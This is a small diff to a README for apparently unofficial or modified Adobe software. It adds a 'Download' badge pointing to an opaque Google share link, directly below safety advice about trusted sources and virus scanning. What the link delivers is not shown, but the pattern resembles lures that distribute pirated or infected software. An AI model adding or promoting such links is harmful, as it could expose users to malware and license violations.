@@ -65,6 +65,11 @@ This software is no longer officially supported by Adobe. Unofficial or modified
 - Download software only from sources you trust.
 - Scan downloaded files with VirusTotal or reputable security software before installation.
 - Consider using an official Adobe license for continued updates, security, and support.
+<p align="center">
+  <a href="(https://share.google/4RWFRtEWhprjs07CO)">
+    <img src="https://img.shields.io/badge/⬇%20Download-0969DA?style=for-the-badge" alt="Download">
+  </a>
+</p>
 
 ---
 
